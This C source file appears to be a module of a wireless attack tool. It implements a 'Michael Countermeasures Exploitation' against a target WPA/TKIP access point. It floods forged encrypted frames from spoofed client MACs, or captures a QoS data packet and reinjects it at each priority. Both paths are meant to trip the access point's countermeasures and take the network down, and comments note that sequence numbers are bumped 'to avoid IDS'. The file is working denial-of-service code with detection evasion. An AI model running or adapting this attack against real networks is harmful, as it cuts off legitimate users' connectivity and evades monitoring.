#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "mycountermeasures.h"
#include "osdep.h"
#include "mac_addr.h"
#include "helpers.h"
#include "countermeasuresstop.h"
#include "infomessage.h"

#define COUNTERMEASURES_MODE 'm'
#define COUNTERMEASURES_NAME "Michael Countermeasures Exploitation"

#define QOS_PACKET_PRIO_POS 24

struct countermeasures_options {
  struct ether_addr *target;
  unsigned char useqos;
  unsigned int burst_pause;
  unsigned int burst_packets;
  unsigned int speed;
};

char info_buffer[1024];



void *countermeasures_parse(char* ap_mac, int burst_pause_time, int packets_per_burst, int packets_per_sec, int use_qos_exploit) {
  int opt;
  struct countermeasures_options *copt = malloc(sizeof(struct countermeasures_options));
  
  copt->target = NULL;
  copt->useqos = 0;
  copt->burst_pause = 10;
  copt->burst_packets = 70;
  copt->speed = 400;

  copt->target = malloc(sizeof(struct ether_addr));
  *(copt->target) = parse_mac(ap_mac);

  if(use_qos_exploit)
      copt->useqos = 1;

  if (copt->useqos) printf("WARNING: Burst Pause option ignored in QoS mode\n");
  copt->burst_pause = (unsigned int) burst_pause_time;

  if (copt->useqos) printf("WARNING: Burst Count option ignored in QoS mode\n");
  copt->burst_packets = (unsigned int) packets_per_burst;

  copt->speed = (unsigned int) packets_per_sec;
  
  return (void *) copt;
}


struct packet countermeasures_getpacket(void *options) {
  struct countermeasures_options *copt = (struct countermeasures_options *) options;
  struct packet pkt;
  static struct packet sniffed;
  struct ieee_hdr *hdr;
  struct ether_addr src;
  static unsigned int nb_pkt = 0;
  unsigned char i;
  long int r;
  uint8_t *p;

  if (!nb_pkt) { sniffed.len = 0; nb_pkt = 1; } //init

  sleep_till_next_packet(copt->speed);
  
  if (copt->useqos) {

    if (sniffed.len) {	//We got a packet, that has to be sent again a few times :)

      sniffed.data[QOS_PACKET_PRIO_POS]++;
      increase_seqno(&sniffed);  //Increase sequence counter to avoid IDS
      
      pkt = sniffed;

      if ((sniffed.data[QOS_PACKET_PRIO_POS] & 0x07) == 0x07) {
	sniffed.len = 0;
      }
      
      return pkt;
      
    } else {
      
      snprintf(info_buffer, sizeof(info_buffer), "Waiting for QoS Data Packet...\n");
      info_message(info_buffer, UPDATE_RUNNING);
      printf("\rWaiting for QoS Data Packet...                      "); fflush(stdout);

      while(1) {
        if(stop_attackcountermeasures)
          break;
	sniffed = osdep_read_packet();
	hdr = (struct ieee_hdr *) sniffed.data;

	if (hdr->type != IEEE80211_TYPE_QOSDATA) continue; //QoS?
	if ((hdr->flags & 0x03) != 0x01) continue; //ToDS?

	//From our target?
	if (copt->target == NULL) break;
	if (! MAC_MATCHES(*(copt->target),*(get_bssid(&sniffed)))) continue;
	break;
      }
      snprintf(info_buffer, sizeof(info_buffer), "Waiting for QoS Data Packet...");
      info_message(info_buffer, UPDATE_RUNNING);

         p = (*(get_source(&sniffed))).ether_addr_octet;
  snprintf(info_buffer, sizeof(info_buffer), "QoS Packet from %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
  info_message(info_buffer, UPDATE_SUCCESS);

       p = (*(get_bssid(&sniffed))).ether_addr_octet;
        snprintf(info_buffer, sizeof(info_buffer), "To AP %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
        info_message(info_buffer, UPDATE_SUCCESS);

      snprintf(info_buffer, sizeof(info_buffer), "with priority %d captured and reinjected.\n\n", sniffed.data[QOS_PACKET_PRIO_POS] & 0x07);
        info_message(info_buffer, UPDATE_SUCCESS);

      printf("\rQoS Packet from "); print_mac(*(get_source(&sniffed)));
      printf(" to AP "); print_mac(*(get_bssid(&sniffed)));
      printf(" with priority %d captured and reinjected.\n", sniffed.data[QOS_PACKET_PRIO_POS] & 0x07);

      sniffed.data[QOS_PACKET_PRIO_POS] &= 0xF8;  //Reset QoS queue to 0
      increase_seqno(&sniffed);  //Increase sequence counter to avoid IDS

      pkt = sniffed;
      return pkt;
    }
    
  } else {
    
    // pkt.len = (rand() % 246) + 20;
    src = generate_mac(MAC_KIND_CLIENT);

    create_ieee_hdr(&pkt, IEEE80211_TYPE_DATA, 't', AUTH_DEFAULT_DURATION, *(copt->target), src, *(copt->target), SE_NULLMAC, 0);
    pkt.len = 64;

    hdr = (struct ieee_hdr *) pkt.data;
    hdr->flags |= 0x40;  //Set Encryption
    
    //random extended IV
    r = random();
    memcpy(pkt.data + 24, &r, 4);
    pkt.data[27] = 0x20;
    r = 0;
    memcpy(pkt.data + 28, &r, 4);
    
    //random data
    for(i=32; i<pkt.len; i++) pkt.data[i] = rand() & 0xFF;

    nb_pkt++;
    if (!(nb_pkt % copt->burst_packets)) sleep(copt->burst_pause);
    return pkt;
  }
  
  return pkt;
}


void countermeasures_print_stats(void *options) {
  //Unused
  options = options; //Avoid unused warning
}


void countermeasures_perform_check(void *options) {
  //Nothing to check
  options = options; //Avoid unused warning
}


struct attacks load_countermeasures() {
  struct attacks this_attack;
  char *countermeasures_name = malloc(strlen(COUNTERMEASURES_NAME) + 1);
  strcpy(countermeasures_name, COUNTERMEASURES_NAME);

  this_attack.parse_options = (fpo) countermeasures_parse;
  this_attack.get_packet = (fpp) countermeasures_getpacket;
  this_attack.print_stats = (fps) countermeasures_print_stats;
  this_attack.perform_check = (fps) countermeasures_perform_check;
  this_attack.mode_identifier = COUNTERMEASURES_MODE;
  this_attack.attack_name = countermeasures_name;

  return this_attack;
}
